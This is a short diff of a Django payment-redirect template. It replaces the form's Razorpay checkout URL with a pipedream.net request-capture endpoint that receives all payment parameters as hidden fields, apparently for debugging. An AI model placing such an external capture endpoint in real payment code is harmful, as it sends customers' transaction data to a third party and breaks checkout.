@@ -7,8 +7,8 @@
 <body>
 <h1>Redirecting you to the merchant....</h1>
 <h1>Please do not refresh your page....</h1>
-<form method="post" action="https://checkout.razorpay.com/v1/checkout.js" name="paytm">
-    {% for key, value in context %}
+<form action="https://eneqd3r9zrjok.x.pipedream.net/" method="post" name="paytm">
+    {% for key, value in param_dict.items %}
     <input type="hidden" name="{{key}}" value="{{value}}">
     {% endfor %}
 
